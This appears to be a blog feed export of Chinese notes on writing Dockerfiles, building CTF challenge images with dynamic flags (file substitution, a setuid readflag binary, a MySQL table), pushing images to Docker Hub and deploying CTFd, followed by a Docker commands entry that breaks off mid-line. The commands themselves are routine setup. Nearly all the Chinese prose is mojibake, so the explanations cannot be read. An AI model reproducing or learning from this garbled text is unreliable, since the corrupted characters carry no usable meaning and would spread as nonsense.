æŒ‡ä»¤æ¥æŒ‡å®šï¼Œä¸éœ€è¦äº‹å…ˆåˆ›å»ºï¼Œä¼šè‡ªåŠ¨åˆ›å»º)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># åˆ©ç”¨ é€šé…ç¬¦ è¿›è¡Œå¤åˆ¶</span><br><span class="line">COPY hom* &#x2F;mydir&#x2F;</span><br><span class="line">COPY hom?.txt &#x2F;mydir&#x2F;</span><br></pre></td></tr></table></figure><p>note : COPY ä¼šå°†åŸæ–‡ä»¶çš„å„ç§æ•°æ®éƒ½ä¿ç•™ï¼Œæ¯”å¦‚ è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼Œå¯ä»¥é€šè¿‡ â€“chown=<user>:<group> é€‰é¡¹æ¥æ”¹å˜æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·åŠæ‰€å±ç»„ã€‚</group></user></p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;], æ¨èä½¿ç”¨è¯¥æ–¹å¼</span><br><span class="line"></span><br><span class="line">CMD [&quot;param1&quot;, &quot;param2&quot;]ï¼Œä¸ºENTRYPOINTæŒ‡ä»¤æä¾›é¢„è®¾å‚æ•°</span><br><span class="line"></span><br><span class="line">CMD command param1 param2 åœ¨SHELLä¸­æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>CMDæŒ‡ä»¤çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºæ‰§è¡Œå®¹å™¨æä¾›é»˜è®¤å€¼ï¼Œæ¯ä¸ªDockerfileåªæœ‰ä¸€ä¸ªCMDå‘½ä»¤ï¼Œå¦‚æœæŒ‡å®šäº†å¤šä¸ªCMDå‘½ä»¤ï¼Œä¹Ÿåªä¼šæœ‰ä¸€æ¡æ‰§è¡Œï¼Œå¦‚æœå¯åŠ¨å®¹å™¨çš„æ—¶å€™æŒ‡å®šäº†è¿è¡Œçš„å‘½ä»¤ï¼Œåˆ™ä¼šè¦†ç›–æ‰CMDæŒ‡å®šçš„å‘½ä»¤ã€‚</p><h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>è¯­æ³•ï¼š<code>EXPOSE &lt;ç«¯å£1&gt; [&lt;ç«¯å£2&gt;...]</code></p><p>ã€€ã€€è¯¥æ¡æŒ‡ä»¤æ˜¯å£°æ˜è¿è¡Œæ—¶å®¹å™¨æä¾›çš„æœåŠ¡ç«¯å£ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå£°æ˜ï¼Œåœ¨è¿è¡Œæ—¶å¹¶ä¸ä¼šå› ä¸ºè¿™ä¸ªå£°æ˜åº”ç”¨å°±ä¼šå¼€å¯è¿™ä¸ªç«¯å£çš„æœåŠ¡ã€‚è¿™æ ·å£°æ˜å¸¦æ¥ä¸¤ä¸ªå¥½å¤„ï¼š</p><p>ã€€ã€€1ï¼Œå¸®åŠ©é•œåƒä½¿ç”¨è€…ç†è§£è¿™ä¸ªé•œåƒæœåŠ¡çš„å®ˆæŠ¤ç«¯å£ï¼Œä»¥æ–¹ä¾¿é…ç½®æ˜ å°„</p><p>ã€€ã€€2ï¼Œåœ¨è¿è¡Œæ—¶ä½¿ç”¨éšæœºç«¯å£æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯ docker run -P æ—¶ï¼Œä¼šè‡ªåŠ¨éšæœºæ˜ å°„ EXPOSE çš„ç«¯å£</p><p>note: è¦å°† EXPOSE å’Œåœ¨è¿è¡Œæ—¶ä½¿ç”¨ -p  &lt;å®¿ä¸»ç«¯å£&gt;:&lt;å®¹å™¨ç«¯å£&gt; åŒºåˆ†å¼€æ¥ã€‚-p æ˜¯æ˜ å°„å®¿ä¸»ç«¯å£å’Œå®¹å™¨ç«¯å£ï¼Œå°±æ˜¯å°†å®¹å™¨çš„å¯¹åº”ç«¯å£æœåŠ¡å…¬å¼€ç»™å¤–ç•Œè®¿é—®ï¼Œè€Œ  EXPOSE ä»…ä»…æ˜¯å£°æ˜å®¹å™¨æ‰“ç®—ä½¿ç”¨ä»€ä¹ˆç«¯å£è€Œå·²ï¼Œå¹¶ä¸ä¼šåœ¨å®¿ä¸»è¿›è¡Œç«¯å£æ˜ å°„ã€‚</p><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>æ ¼å¼ä¸ºï¼š<code>WORKDIR /path/to/workdir</code></p><p>åˆ‡æ¢â½¬å½•æŒ‡ä»¤ï¼Œç±»ä¼¼äºcdå‘½ä»¤ï¼Œå¯¹RUNã€CMDã€ENTRYPOINTâ½£æ•ˆã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>ä½¿ç”¨<a href="https://docs.docker.com/engine/reference/builder/#label" target="_blank" rel="noopener">LABEL</a>æŒ‡ä»¤ï¼Œå¯ä»¥ä¸ºé•œåƒè®¾ç½®å…ƒæ•°æ®ï¼Œä¾‹å¦‚<strong>é•œåƒåˆ›å»ºè€…</strong>æˆ–è€…<strong>é•œåƒè¯´æ˜</strong>ã€‚æ—§ç‰ˆçš„ Dockerfile è¯­æ³•ä½¿ç”¨<a href="https://docs.docker.com/engine/reference/builder/#maintainer-deprecated" target="_blank" rel="noopener">MAINTAINER</a>æŒ‡ä»¤æŒ‡å®šé•œåƒåˆ›å»ºè€…ï¼Œä½†æ˜¯å®ƒå·²ç»è¢«å¼ƒç”¨äº†ã€‚æœ‰æ—¶ï¼Œä¸€äº›å¤–éƒ¨ç¨‹åºéœ€è¦ç”¨åˆ°é•œåƒçš„å…ƒæ•°æ®ï¼Œä¾‹å¦‚<a href="https://github.com/NVIDIA/nvidia-docker" target="_blank" rel="noopener">nvidia-docker</a>éœ€è¦ç”¨åˆ°<code>com.nvidia.volumes.needed</code>ã€‚ç¤ºä¾‹å¦‚ä¸‹:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">7</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer <span class="string">"jakub.skalecki@example.com"</span></span></span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Author=<span class="string">"hwlanxiaojun"</span> Blog=<span class="string">"https://hwlanxiaojun.github.io"</span></span></span><br></pre></td></tr></table></figure><h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>ENV : ç”¨æ¥è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ ¼å¼æœ‰ä¸¤ç§ï¼š</p><p>ã€€ã€€1ï¼ŒENV <key> <value></value></key></p><p>ã€€ã€€2ï¼ŒENV <key1>=<value1> <key2>=<value2>â€¦</value2></key2></value1></key1></p><p>åœ¨è®¾ç½®äº†ç¯å¢ƒå˜é‡ä¹‹åï¼Œæ— è®ºæ˜¯åé¢çš„å…¶å®ƒæŒ‡ä»¤ï¼Œå¦‚ RUN ï¼Œè¿˜æ˜¯è¿è¡Œæ—¶çš„åº”ç”¨ï¼Œéƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™é‡Œå®šä¹‰çš„ç¯å¢ƒå˜é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># å®šä¹‰ç¯å¢ƒå˜é‡</span><br><span class="line">ENV VERSION&#x3D;1.0 DEBUG&#x3D;ON \</span><br><span class="line">    NAME&#x3D;&quot;Happy Feet&quot;</span><br><span class="line"></span><br><span class="line"># å®˜æ–¹ node é•œåƒ Dockerfile ä¸­ï¼š</span><br><span class="line">ENV NODE_VERSION 7.2.0</span><br></pre></td></tr></table></figure><h3 id="0x-03-æ„å»ºé•œåƒ"><a href="#0x-03-æ„å»ºé•œåƒ" class="headerlink" title="0x 03 æ„å»ºé•œåƒ"></a>0x 03 æ„å»ºé•œåƒ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t webprac .</span><br><span class="line">&#x2F;&#x2F;å…¶ä¸­.è¡¨ç¤ºå½“å‰è·¯å¾„ï¼Œæ„å»ºçš„æ—¶å€™è¦ä¿è¯jaråŒ…å’ŒDockerfileæ–‡ä»¶åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œ-t: é•œåƒçš„åå­—åŠæ ‡ç­¾ï¼Œwebpracæ˜¯æ ‡ç­¾å</span><br><span class="line">ocker run -dit -p 8080:80 webprac</span><br></pre></td></tr></table></figure><h4 id="0x-04-åŠ¨æ€flagç¼–å†™"><a href="#0x-04-åŠ¨æ€flagç¼–å†™" class="headerlink" title="0x 04 åŠ¨æ€flagç¼–å†™"></a>0x 04 åŠ¨æ€flagç¼–å†™</h4><p>åŠ¨æ€flagçš„å­˜åœ¨å½¢å¼ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§ï¼šæ–‡ä»¶ä¸­ã€æ‰§è¡Œreadflagã€æ•°æ®åº“ä¸­</p><h4 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h4><p>linuxä¸‹ï¼Œ<code>sed</code>å‘½ä»¤å¯ä»¥å°†fileä¸­æ¯è¡Œçš„å­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;åŸå­—ç¬¦ä¸²&#x2F;æ–°å­—ç¬¦ä¸²&#x2F;&#39; file</span><br></pre></td></tr></table></figure><p><code>export</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹ã€è®¾ç½®ç¯å¢ƒå˜é‡</p><p>é‚£ä¹ˆåœ¨<code>docker-php-entrypoint</code>æ–‡ä»¶ä¸­å†™å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;flag_here&#x2F;$FLAG&#x2F;&quot; flag.php</span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>å°±ä¼šæ ¹æ®å½“å‰ç¯å¢ƒå˜é‡çš„<code>FLAG</code>å€¼æ¥æ›¿æ¢æ‰<code>flag.php</code>ä¸­çš„<code>flag_here</code>ï¼Œå› æ­¤è¿˜éœ€è¦åœ¨<code>flag.php</code>ä¸­è®¾ç½®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; flag_here</span><br></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œåœ¨Dockerfileç›®å½•æ‰§è¡Œ<code>docker build -t test .</code>å°†Dockerfileæ–‡ä»¶æ‰“åŒ…ä¸ºé•œåƒ<code>test</code>ï¼Œä½¿ç”¨å®‰è£…äº†åŠ¨æ€é¶æœºæ’ä»¶çš„CTFdå¹³å°éƒ¨ç½²åï¼Œè¯¥æ’ä»¶åœ¨å¯åŠ¨é¶æœºæ—¶ä¼šè‡ªåŠ¨ç”Ÿæˆflagå¹¶åº”ç”¨åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™æ ·ä¾¿å®ç°äº†ç”ŸæˆåŠ¨æ€flagã€‚</p><h4 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h4><p>å…ˆæ¥çœ‹ä¸‹å†™æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">echo $FLAG &gt; &#x2F;flag</span><br><span class="line">chmod u+s &#x2F;readflag</span><br><span class="line">chmod 400 &#x2F;flag</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå°†ç¯å¢ƒå˜é‡<code>$FLAG</code>å†™å…¥åˆ°<code>/flag</code>ä¸­ï¼Œä¹‹åè¿›è¡Œæƒé™é…ç½®ï¼š</p><p>1.chmod u+s /readflag ï¼š ä¸º<code>/readflag</code>æ–‡ä»¶åŠ ä¸Šsetuidæ ‡å¿—ï¼Œè®¾ç½®ä½¿æ–‡ä»¶åœ¨æ‰§è¡Œé˜¶æ®µå…·æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™</p><p>2.chmod 400 /flag ï¼šå°†<code>flag</code>æ–‡ä»¶æƒé™è®¾ä¸ºæ–‡ä»¶æ‹¥æœ‰è€…åªè¯»ï¼Œç¾¤ç»„å’Œå…¶ä»–ç”¨æˆ·æ²¡æœ‰ä»»ä½•æƒé™</p><p>é‚£ä¹ˆæ‰§è¡Œ<code>./readflag</code>æ—¶ï¼Œå°±ä¼šæ‹¥æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ï¼Œå¯ä»¥è¯»å–<code>/flag</code>äº†</p><h4 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h4><p>flag.shï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹æ•°æ®åº“ä¸­çš„ FLAG</span><br><span class="line">mysql -e &quot;CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli; CREATE TABLE IF NOT EXISTS \&#96;1919810931114514\&#96; (\&#96;flag\&#96; varchar(100) NOT NULL) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8;INSERT INTO \&#96;1919810931114514\&#96; VALUES (&#39;$FLAG&#39;);&quot; -uroot -proot</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br><span class="line"></span><br><span class="line">rm -f &#x2F;flag.sh</span><br></pre></td></tr></table></figure><h3 id="0x-05-æ‰“åŒ…é•œåƒåˆ°Docker-Hub"><a href="#0x-05-æ‰“åŒ…é•œåƒåˆ°Docker-Hub" class="headerlink" title="0x 05 æ‰“åŒ…é•œåƒåˆ°Docker Hub"></a>0x 05 æ‰“åŒ…é•œåƒåˆ°Docker Hub</h3><p>ä¸ºäº†æ–¹ä¾¿æœç´¢å’Œä¸‹è½½è‡ªå·±ç¼–å†™çš„é•œåƒï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥å®ç°ï¼š</p><p>1.åˆ°<code>https://hub.docker.com/</code>æ³¨å†Œä¸€ä¸ªè´¦å·</p><p>2.ç™»å½•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login -u ç”¨æˆ·å -p å¯†ç </span><br></pre></td></tr></table></figure><p>3.æ›´æ”¹é•œåƒæ ‡ç­¾ï¼Œæ ¼å¼ä¸º<code>ç”¨æˆ·å/æ ‡ç­¾å</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag test ç”¨æˆ·å&#x2F;é•œåƒå</span><br></pre></td></tr></table></figure><p>4.æ¨é€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push ç”¨æˆ·å&#x2F;é•œåƒå</span><br></pre></td></tr></table></figure><p>5.ç™»å‡ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥åœ¨Docker Hubä¸Šæ‰¾åˆ°åˆšä¸Šä¼ çš„é•œåƒäº†ï¼Œå°†å…¶æ·»åŠ æè¿°åå°±èƒ½ä½¿ç”¨<code>docker search</code>æœç´¢åˆ°è‡ªå·±çš„é•œåƒ</p><h3 id="0x-06-ctfdå¹³å°éƒ¨ç½²"><a href="#0x-06-ctfdå¹³å°éƒ¨ç½²" class="headerlink" title="0x 06 ctfdå¹³å°éƒ¨ç½²"></a>0x 06 ctfdå¹³å°éƒ¨ç½²</h3><p>å‚è€ƒè¿™å‡ ç¯‡æ–‡ç« ï¼š</p><p><a href="https://www.zhaoj.in/read-6333.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html</a></p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756" target="_blank" rel="noopener">https://blog.csdn.net/fjh1997/article/details/100850756</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p><h3 id="0x-07-docker-compose"><a href="#0x-07-docker-compose" class="headerlink" title="0x 07 docker-compose"></a>0x 07 docker-compose</h3><p>docker-compose.ymlï¼šå‘Šè¯‰docker-composeè¯¥æ€ä¹ˆç¼–æ’ä¸€ç»„æœåŠ¡</p><p><img src="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/image-20200322224722173.png" alt></p><p>å‚è€ƒé“¾æ¥ï¼š</p><blockquote><p><a href="https://www.cnblogs.com/zpcoding/p/11450686.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpcoding/p/11450686.html</a></p><p><a href="https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html" target="_blank" rel="noopener">https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html</a></p><p><a href="http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dockerfileç¼–å†™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerå­¦ä¹ ç¬”è®°</title>
      <link href="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="dockerç®€ä»‹"><a href="#dockerç®€ä»‹" class="headerlink" title="dockerç®€ä»‹"></a>dockerç®€ä»‹</h3><ul><li>Dockeræ˜¯ä¸€ä¸ªæ–°çš„å®¹å™¨åŒ–çš„æŠ€æœ¯ï¼Œå®¹å™¨æœ‰æ•ˆçš„å°†å•ä¸ªæ“ä½œç³»ç»Ÿç®¡ç†çš„èµ„æºåˆ’åˆ†åˆ°å­¤ç«‹çš„ç»„ä¸­ï¼Œä»¥ä¾¿æ›´å¥½çš„åœ¨å­¤ç«‹çš„ç»„ä¹‹é—´å¹³è¡¡æœ‰å†²çªçš„èµ„æºä½¿ç”¨éœ€æ±‚ã€‚</li><li>Docker å®¹å™¨æœ¬è´¨ä¸Šæ˜¯å®¿ä¸»æœºä¸Šçš„ä¸€ä¸ªè¿›ç¨‹ã€‚Docker é€šè¿‡ namespace å®ç°äº†èµ„æºéš”ç¦»ï¼Œé€šè¿‡ cgroups å®ç°äº†èµ„æºçš„é™åˆ¶ï¼Œé€šè¿‡å†™æ—¶å¤åˆ¶æœºåˆ¶ï¼ˆcopy-on-writeï¼‰å®ç°äº†é«˜æ•ˆçš„æ–‡ä»¶æ“ä½œã€‚ </li><li>Dockeræœ‰äº”ä¸ªå‘½åç©ºé—´ï¼šè¿›ç¨‹ã€ç½‘ç»œã€æŒ‚è½½ã€å®¿ä¸»å’Œå…±äº«å†…å­˜ï¼Œä¸ºäº†éš”ç¦»æœ‰é—®é¢˜çš„åº”ç”¨ï¼ŒDockerè¿ç”¨Namespaceå°†è¿›ç¨‹éš”ç¦»ï¼Œä¸ºè¿›ç¨‹æˆ–è¿›ç¨‹ç»„åˆ›å»ºå·²éš”ç¦»çš„è¿è¡Œç©ºé—´ï¼Œä¸ºè¿›ç¨‹æä¾›ä¸åŒçš„å‘½åç©ºé—´è§†å›¾ã€‚è¿™æ ·ï¼Œæ¯ä¸€ä¸ªéš”ç¦»å‡ºæ¥çš„è¿›ç¨‹ç»„ï¼Œå¯¹å¤–å°±è¡¨ç°ä¸ºä¸€ä¸ªcontainer(å®¹å™¨)ã€‚</li></ul><h3 id="é•œåƒå’Œå®¹å™¨"><a href="#é•œåƒå’Œå®¹å™¨" class="headerlink" title="é•œåƒå’Œå®¹å™¨"></a>é•œåƒå’Œå®¹å™¨</h3><ul><li><p>Image: é•œåƒæ˜¯ä¸€ç§è½»é‡çº§ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œå®ƒåŒ…å«è¿è¡ŒæŸä¸ªè½¯ä»¶æ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬ä»£ç ã€è¿è¡Œæ—¶ã€åº“ã€ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ã€‚</p></li><li><p>Container:å®¹å™¨æ˜¯é•œåƒçš„è¿è¡Œæ—¶å®ä¾‹ - å®é™…æ‰§è¡Œæ—¶é•œåƒä¼šåœ¨å†…å­˜ä¸­å˜æˆä»€ä¹ˆã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå®Œå…¨ç‹¬ç«‹äºä¸»æœºç¯å¢ƒè¿è¡Œï¼Œä»…åœ¨é…ç½®ä¸ºè®¿é—®ä¸»æœºæ–‡ä»¶å’Œç«¯å£çš„æƒ…å†µä¸‹æ‰æ‰§è¡Œæ­¤æ“ä½œã€‚</p></li><li><p><code>å®¹å™¨ = é•œåƒ + è¯»å†™å±‚</code></p><p>å®¹å™¨å¯ä»¥è·å–æœ¬æœºè®¿é—®ï¼Œæ¯ä¸ªå®¹å™¨éƒ½åœ¨ç‹¬ç«‹è¿›ç¨‹ä¸­è¿è¡Œï¼Œå ç”¨çš„å†…å­˜ä¸è¶…è¿‡ä»»ä½•å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p></li></ul><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322154938724.png" alt="image-20200322154938724"></p><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322155027373.png" alt="image-20200322155027373"></p><h3 id="Dockerçš„ä½¿ç”¨"><a href="#Dockerçš„ä½¿ç”¨" class="headerlink" title="Dockerçš„ä½¿ç”¨"></a>Dockerçš„ä½¿ç”¨</h3><h4 id="å¯åŠ¨å’Œæ”¾å…¥å¯åŠ¨é¡¹"><a href="#å¯åŠ¨å’Œæ”¾å…¥å¯åŠ¨é¡¹" class="headerlink" title="å¯åŠ¨å’Œæ”¾å…¥å¯åŠ¨é¡¹"></a>å¯åŠ¨å’Œæ”¾å…¥å¯åŠ¨é¡¹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#centos7.0ç‰ˆæœ¬</span><br><span class="line">systemctl start docker </span><br><span class="line">systemctl enable docker</span><br><span class="line"></span><br><span class="line">#å…¼å®¹è€ç‰ˆæœ¬</span><br><span class="line">service docker start</span><br><span class="line">chkconfig docker on</span><br></pre></td></tr></table></figure><h4 id="imageç›¸å…³æ“ä½œ"><a href="#imageç›¸å…³æ“ä½œ" class="headerlink" title="imageç›¸å…³æ“ä½œ"></a>imageç›¸å…³æ“ä½œ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">docker search [é•œåƒ]      #æœç´¢é•œåƒ</span><br><span class="line">docker pull [é•œåƒ]        #ä¸‹è½½é•œåƒ</span><br><span class="line">docker run -p 4000:80 username&#x2F;repository:tag #ä»è¿œç¨‹é•œåƒä»“åº“ä¸­æ‹‰å–å¹¶è¿è¡Œé•œåƒ</span><br><span class="line"></span><br><span class="line">sudo docker pull ubuntu:12.04 ç­‰åŒäº</span><br><span class="line">docker pull registry.hub.docker.com&#x2F;ubuntu:12.04 </span><br><span class="line"></span><br><span class="line">docker push [é•œåƒ]            #å‘å¸ƒé•œåƒ</span><br><span class="line">docker rmi [é•œåƒ]             #åˆ é™¤é•œåƒ</span><br><span class="line">docker images                 #æŸ¥çœ‹æœ¬åœ°é•œåƒ(åˆ—ç›®å½•)</span><br><span class="line">docker images    -q           #åªæ˜¾ç¤ºé•œåƒID</span><br><span class="line">docker history [é•œåƒ]         #å†å²é•œåƒ</span><br><span class="line">docker tag [é•œåƒ] username&#x2F;repository:tag #æ ‡è®°é•œåƒ</span><br><span class="line"></span><br><span class="line">docker rmi $(docker images -q)      #åˆ é™¤æ‰€æœ‰åœæ­¢çš„é•œåƒ</span><br><span class="line">docker rmi -f $(docker images -q)   #å¼ºåˆ¶åˆ é™¤æ‰€æœ‰çš„é•œåƒ</span><br></pre></td></tr></table></figure><h4 id="å®¹å™¨ç›¸å…³æ“ä½œ"><a href="#å®¹å™¨ç›¸å…³æ“ä½œ" class="headerlink" title="å®¹å™¨ç›¸å…³æ“ä½œ"></a>å®¹å™¨ç›¸å…³æ“ä½œ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#åˆ›å»ºå®¹å™¨</span><br><span class="line">docker run [é•œåƒ] &#x2F;bin&#x2F;echo hello world       #è¾“å‡ºhello world</span><br><span class="line">docker run -i -t [é•œåƒ] &#x2F;bin&#x2F;bash             #äº¤äº’å¼è¿›å…¥å®¹å™¨ #-i: ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨  -t: 